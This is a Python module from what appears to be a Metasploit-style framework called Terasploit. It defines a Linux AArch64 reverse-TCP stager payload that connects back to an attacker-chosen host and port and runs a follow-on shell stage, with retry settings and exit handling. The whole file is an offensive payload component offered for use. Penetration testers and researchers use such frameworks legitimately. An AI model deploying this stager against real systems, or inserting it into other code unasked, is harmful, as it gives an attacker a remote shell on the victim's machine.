from collections.abc import Sequence

from teralibs.tsf.base.payload import (
    ARCH_AARCH64,
    PLATFORM_LINUX,
    STAGER,
    Payload,
    PayloadHandler,
)
from teralibs.tsf.core.payload.linux.aarch64.reverse_tcp import ReverseTcpAarch64


class TerasploitModule(ReverseTcpAarch64, Payload):
    """Linux AArch64 reverse-TCP stager."""

    NAME: str = "Linux AArch64 Reverse TCP Stager"
    DESCRIPTION: str = (
        "Linux AArch64 (ARM64) stager that opens a reverse TCP channel to the attacker and executes the companion stage delivered by the framework."
    )
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.0"
    RANK: str = "normal"
    REFERENCES: Sequence = [
        "https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/linux/aarch64/reverse_tcp.rb",
        "https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/linux/aarch64/reverse_tcp.rb",
    ]
    PAYLOAD_TYPE: str = STAGER
    HANDLER: object = PayloadHandler.ReverseTCP
    STAGE_PATH: str = "linux.aarch64.shell"
    CACHED_SIZE: int = 208
    MAX_SIZE: int | None = 512
    ARCH: Sequence = [ARCH_AARCH64]
    PLATFORM: Sequence = [PLATFORM_LINUX]
    OPTIONS: Sequence = ["LHOST", "LPORT", "BADCHARS"]

    def generate(self, ctx):
        """
        Generate the Linux AArch64 reverse-TCP stager shellcode.
        """
        host = ctx.get_option("LHOST")
        port = int(ctx.get_option("LPORT"))
        retry_count = int(ctx.get_option("StagerRetryCount") or 10)
        sleep_seconds = float(ctx.get_option("StagerRetryWait") or 5.0)
        exitfunc = str(ctx.get_option("EXITFUNC") or "process").lower().strip()

        shellcode = self.generate_reverse_tcp(
            host_option=(host, port, exitfunc),
            retry_count=retry_count,
            sleep_seconds=sleep_seconds,
        )

        shellcode = self.apply_prepends(shellcode, ctx)
        return shellcode
